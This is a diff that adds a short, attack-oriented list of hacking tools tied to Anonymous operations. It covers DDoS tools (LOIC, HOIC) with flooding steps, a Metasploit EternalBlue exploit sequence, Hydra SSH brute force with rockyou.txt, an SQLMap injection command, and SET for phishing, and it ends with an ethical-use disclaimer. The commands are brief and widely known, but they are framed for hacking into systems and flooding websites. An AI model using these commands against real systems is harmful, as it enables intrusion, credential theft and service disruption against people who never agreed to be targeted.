@@ -1,0 +1,79 @@
+🔧 1. LOIC (Low Orbit Ion Cannon)
+Use: DDoS attacks (flooding websites with traffic).
+
+Anonymous connection: Widely used in Anonymous operations like #OpPayback.
+
+How to use: GUI-based tool; target a website and set the flood method (TCP/UDP/HTTP).
+
+🛠 2. HOIC (High Orbit Ion Cannon)
+Use: Advanced version of LOIC for DDoS.
+
+Anonymous connection: Used in coordinated Anonymous attacks.
+
+How to use: Add "boosters" (scripts), input target URL, launch attack.
+
+🌐 3. Tor Browser / Tails OS
+Use: Anonymity and encrypted communications.
+
+Anonymous connection: Core to staying untraceable.
+
+How to use: Download and run Tor, or boot from Tails USB for complete anonymity.
+
+🧰 4. Metasploit Framework
+Use: Exploitation, payload creation, hacking into systems.
+
+How to use:
+
+bash
+Copy
+Edit
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST <target IP>
+run
+📡 5. Nmap
+Use: Network scanning, discovering open ports and services.
+
+Command Example:
+
+bash
+Copy
+Edit
+nmap -sS -A <target IP>
+💣 6. Hydra
+Use: Brute force attacks on logins (FTP, SSH, HTTP).
+
+Command Example:
+
+bash
+Copy
+Edit
+hydra -l admin -P rockyou.txt ssh://192.168.1.10
+🕷 7. SQLMap
+Use: Automated SQL injection.
+
+Command Example:
+
+bash
+Copy
+Edit
+sqlmap -u "http://target.com/index.php?id=1" --dbs
+🐍 8. Python Scripts
+Use: Custom attack bots, DDoS, scanning tools.
+
+Anonymous members often write and share custom Python tools.
+
+🕸 9. Wireshark
+Use: Sniffing network traffic (clear-text passwords, session cookies).
+
+💀 10. Social Engineering Toolkit (SET)
+Use: Phishing, fake login pages, payload delivery.
+
+Command:
+
+bash
+Copy
+Edit
+setoolkit
+⚠️ DISCLAIMER:
+These tools are used by ethical hackers and penetration testers for educational and security testing purposes only. Unauthorized use is illegal and punishable under cybercrime laws.
